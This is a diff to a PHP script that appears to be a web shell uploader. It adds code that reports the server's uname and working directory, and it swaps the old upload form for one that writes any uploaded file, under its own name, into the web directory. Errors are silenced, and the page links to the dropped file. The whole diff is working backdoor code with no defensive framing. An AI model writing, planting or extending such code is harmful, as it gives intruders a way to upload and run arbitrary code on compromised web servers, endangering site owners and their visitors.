@@ -5,6 +5,9 @@ $server = $_SERVER['HTTP_HOST'];
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
+echo "<b>Uname:".php_uname()."<br></b>"; 
+echo "<b>Base Dir : ".getcwd ()."<br></b>";
+
 function http_get($url){
 $im = curl_init($url);
 curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
@@ -69,9 +72,29 @@ if ( $_SESSION['pass']!== $pass)
 ?>
 
 
-<form enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
-File mu mas : <input name="file" type="file" /><br />
-<input type="submit" value="Upload" /></form>
+<?php
+
+error_reporting(0);
+set_time_limit(0);
+echo '<font color="black" size="4">';
+if(isset($_POST['Submit'])){
+    $filedir = ""; 
+    $maxfile = '2000000';
+    $mode = '0644';
+    $userfile_name = $_FILES['image']['name'];
+    $userfile_tmp = $_FILES['image']['tmp_name'];
+    if(isset($_FILES['image']['name'])) {
+        $qx = $filedir.$userfile_name;
+        @move_uploaded_file($userfile_tmp, $qx);
+        @chmod ($qx, octdec($mode));
+    echo" <a href=$userfile_name><b>Sucessfully Uploaded :D ==> $userfile_name</b></a>";
+    }
+}else{
+    echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
+}
+echo '</center></font>';
+
+?>
 
 
 <?php
